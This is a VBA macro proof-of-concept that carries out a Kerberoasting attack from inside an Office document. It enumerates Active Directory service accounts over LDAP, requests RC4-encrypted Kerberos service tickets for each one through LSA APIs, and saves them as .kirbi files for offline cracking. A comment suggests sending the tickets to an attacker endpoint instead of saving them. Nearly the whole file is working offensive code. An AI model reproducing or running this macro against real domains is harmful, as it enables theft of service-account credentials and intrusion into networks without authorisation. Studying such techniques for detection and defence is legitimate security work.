' Kerberoast implemented in VBA Macro
' PoC by Juan Manuel Fernandez (@TheXC3LL)
' Retrieve SPNs via LDAP queries, then ask a TGS Ticket with RC4 Etype for each one. The ticket is exported in KiRBi format (like mimikatz does)


Private Declare PtrSafe Function LsaConnectUntrusted Lib "SECUR32" (ByRef LsaHandle As LongPtr) As Long
Private Declare PtrSafe Function LsaLookupAuthenticationPackage Lib "SECUR32" (ByVal LsaHandle As LongPtr, ByRef PackageName As LSA_STRING, ByRef AuthenticationPackage As LongLong) As Long
Private Declare PtrSafe Function LsaCallAuthenticationPackage Lib "SECUR32" (ByVal LsaHandle As LongPtr, ByVal AuthenticationPackage As LongLong, ByVal ProtocolSubmitBuffer As LongPtr, ByVal SubmitBufferLength As Long, ProtocolReturnBuffer As Any, ByRef ReturnBufferLength As Long, ByRef ProtocolStatus As Long) As Long
Private Declare PtrSafe Sub CopyMemory Lib "KERNEL32" Alias "RtlMoveMemory" (ByVal Destination As LongPtr, ByVal Source As LongPtr, ByVal Length As Long)
Private Declare PtrSafe Function GetProcessHeap Lib "KERNEL32" () As LongPtr
Private Declare PtrSafe Function HeapAlloc Lib "KERNEL32" (ByVal hHeap As LongPtr, ByVal dwFlags As Long, ByVal dwBytes As LongLong) As LongPtr
Private Declare PtrSafe Function HeapFree Lib "KERNEL32" (ByVal hHeap As LongPtr, ByVal dwFlags As Long, lpMem As Any) As Long

Private Type LSA_STRING
    Length As Integer
    MaximumLength As Integer
    Buffer As String
End Type
Private Enum KERB_PROTOCOL_MESSAGE_TYPE
    KerbDebugRequestMessage = 0
    KerbQueryTicketCacheMessage
    KerbChangeMachinePasswordMessage
    KerbVerifyPacMessage
    KerbRetrieveTicketMessage
    KerbUpdateAddressesMessage
    KerbPurgeTicketCacheMessage
    KerbChangePasswordMessage
    KerbRetrieveEncodedTicketMessage
    KerbDecryptDataMessage
    KerbAddBindingCacheEntryMessage
    KerbSetPasswordMessage
    KerbSetPasswordExMessage
    KerbVerifyCredentialsMessage
    KerbQueryTicketCacheExMessage
    KerbPurgeTicketCacheExMessage
    KerbRefreshSmartcardCredentialsMessage
    KerbAddExtraCredentialsMessage
    KerbQuerySupplementalCredentialsMessage
    KerbTransferCredentialsMessage
    KerbQueryTicketCacheEx2Message
End Enum
Private Type SecHandle
    dwLower As LongPtr
    dwUpper As LongPtr
End Type
Private Type KERB_RETRIEVE_TKT_REQUEST
    MessageType As KERB_PROTOCOL_MESSAGE_TYPE
    LogonIdLower As Long
    LogonIdHigher As LongLong
    TargetNameLength As Integer
    TargetNameMaximumLength As Integer
    TargetNameBuffer As LongPtr
    TicketFlags As Long
    CacheOptions As Long
    EncryptionType As Long
    CredentialsHandle As SecHandle
End Type

Sub askTGS(target As String)
    Dim Status As Long
    Dim SubStatus As Long
    Dim pLogonHandle As LongPtr
    Dim Name As LSA_STRING
    Dim pPackageId As LongLong
    Dim KerbRetrieveRequest As KERB_RETRIEVE_TKT_REQUEST
    Dim KerbRetrieveResponse As LongPtr
    Dim ResponseSize As Long

    Status = LsaConnectUntrusted(pLogonHandle)
    If Status <> 0 Then
        MsgBox "Error, LsaConnectUntrusted failed!"
        Return
    End If

    With Name
        .Length = Len("Kerberos")
        .MaximumLength = Len("Kerberos") + 1
        .Buffer = "Kerberos"
    End With

    Status = LsaLookupAuthenticationPackage(pLogonHandle, Name, pPackageId)
    If Status <> 0 Then
        MsgBox "Error, LsaLookupAuthenticationPackage failed!"
        Return
    End If

    With KerbRetrieveRequest
        .MessageType = KerbRetrieveEncodedTicketMessage
        .EncryptionType = 23 'KERB_ETYPE_RC4_HMAC_NT
        .CacheOptions = 8 'KERB_RETRIEVE_TICKET_AS_KERB_CRED
        .TargetNameLength = LenB(target)
        .TargetNameMaximumLength = LenB(target) + 2
        .TargetNameBuffer = 1337 'random value, we change it later
    End With

    'Copy the struct to an array and add the string with the target
    Dim tmpBuffer() As Byte
    Dim Dummy As String
    ReDim tmpBuffer(0 To LenB(KerbRetrieveRequest) - 1)
    Call CopyMemory(VarPtr(tmpBuffer(0)), VarPtr(KerbRetrieveRequest), LenB(KerbRetrieveRequest) - 1)
    Dummy = StrConv(tmpBuffer, vbUnicode)
    Dummy = Dummy & StrConv(target, vbUnicode)

    'Get the buffer memory address
    Dim fixedAddress As LongPtr
    Dim tempToFix() As Byte
    tempToFix = StrConv(Dummy, vbFromUnicode)
    fixedAddress = VarPtr(tempToFix(64))

    'Alloc memory from heap and copy the struct
    Dim heap As LongPtr
    Dim mem As LongPtr
    heap = GetProcessHeap()
    mem = HeapAlloc(heap, 0, LenB(KerbRetrieveRequest) + LenB(target))
    Call CopyMemory(mem, VarPtr(tempToFix(0)), LenB(KerbRetrieveRequest) + LenB(target))

    'Fix the buffer address
    fixedAddress = mem + 64
    Call CopyMemory(mem + 24, VarPtr(fixedAddress), 8)

    'Do the call
    Status = LsaCallAuthenticationPackage(pLogonHandle, pPackageId, mem, LenB(KerbRetrieveRequest) + LenB(target), KerbRetrieveResponse, ResponseSize, SubStatus)
    If Status <> 0 Then
        MsgBox "Error, LsaCallAuthenticationPackage failed!"
    End If

    'Copy KERB_RETRIEVE_TKT_RESPONSE structure to an array
    Dim Response() As Byte
    Dim Data As String
    ReDim Response(0 To ResponseSize)
    Call CopyMemory(VarPtr(Response(0)), KerbRetrieveResponse, ResponseSize)

    'Ticket->EncodedTicketSize
    Dim ticketSize As Integer
    Call CopyMemory(VarPtr(ticketSize), VarPtr(Response(136)), 4)

    'Ticket->EncodedTicket (address)
    Dim encodedTicketAddress As LongPtr
    Call CopyMemory(VarPtr(encodedTicketAddress), VarPtr(Response(144)), 8)

    'Ticket->EncodedTicket (value)
    Dim encodedTicket() As Byte
    ReDim encodedTicket(0 To ticketSize)
    Call CopyMemory(VarPtr(encodedTicket(0)), encodedTicketAddress, ticketSize)

    'Save it (change it to send the ticket directly to your endpoint)
    Dim fileName As String
    fileName = Replace(target, "/", "_")
    fileName = Replace(fileName, ":", "_")
    MsgBox fileName
    Open fileName & ".kirbi" For Binary Access Write As #1
        lWritePos = 1
        Put #1, lWritePos, encodedTicket
    Close #1

End Sub
'Helper
Public Function toStr(pVar_In As Variant) As String
    On Error Resume Next
    toStr = CStr(pVar_In)
End Function

Sub kerberoast() 'https://www.remkoweijnen.nl/blog/2007/11/01/query-active-directory-from-excel/
    'Get the domain string ("dc=domain, dc=local")
    Dim strDomain As String
    strDomain = GetObject("LDAP://rootDSE").Get("defaultNamingContext")

    'ADODB Connection to AD
    Dim objConnection As Object
    Set objConnection = CreateObject("ADODB.Connection")
    objConnection.Open "Provider=ADsDSOObject;"

    'Connection
    Set objCommand = CreateObject("ADODB.Command")
    objCommand.ActiveConnection = objConnection

    'Search the AD recursively, starting at root of the domain
    objCommand.CommandText = _
        "<LDAP://" & strDomain & ">;(&(objectclass=user)(servicePrincipalName=*));,servicePrincipalName;subtree"
    Set objRecordSet = objCommand.Execute

    Dim i As Long

    If objRecordSet.EOF And objRecordSet.BOF Then
    Else
        Dim c As Integer
        c = 1
        Do While Not objRecordSet.EOF
            For i = 0 To objRecordSet.Fields.Count - 1
                Cells(c, 1) = objRecordSet.Fields("servicePrincipalName").Value
                Dim k As String
                k = Cells(c, 1)
                askTGS (k)
            Next i
            objRecordSet.MoveNext
        c = c + 1
        Loop
    End If

    'Close connection
    objConnection.Close

    'Cleanup
    Set objRecordSet = Nothing
    Set objCommand = Nothing
    Set objConnection = Nothing
End Sub


